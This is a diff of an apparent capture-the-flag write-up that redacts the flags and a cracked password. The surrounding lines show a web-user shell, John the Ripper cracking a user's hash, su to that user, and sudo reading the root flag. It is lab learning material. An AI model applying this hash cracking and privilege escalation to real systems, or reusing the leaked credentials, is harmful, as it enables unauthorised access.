@@ -110,7 +110,7 @@ www-data@ubuntu:/home$ cd vianka/
 www-data@ubuntu:/home/vianka$ ls
 	redis-stable  user.txt
 www-data@ubuntu:/home/vianka$ cat user.txt 
-	thm{red1s_rce_w1thout_credent1als} 
+	thm{[removed]} 
 ```
 
 ## Privilege Escalation vianka
@@ -137,7 +137,7 @@ Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])
 Cost 1 (iteration count) is 5000 for all loaded hashes
 Will run 8 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-beautiful1       (vianka)     
+[removed]       (vianka)     
 1g 0:00:00:00 DONE (2025-02-13 05:02) 10.00g/s 20480p/s 20480c/s 20480C/s 123456..lovers1
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
@@ -146,7 +146,7 @@ Session completed.
 Using the cracked password, I successfully logged in as `vianka`:
 ```bash
 www-data@ubuntu:/home/vianka$ su vianka 
-Password: 
+  Password: 
 vianka@ubuntu:~$
 ```
 
@@ -166,7 +166,7 @@ User vianka may run the following commands on ubuntu:
 From here I just needed to read the flag:
 ```bash
 vianka@ubuntu:~$ sudo cat /root/root.txt
-thm{xxd_pr1v_escalat1on}
+thm{[removed]}
 ```
 
 solved! :)
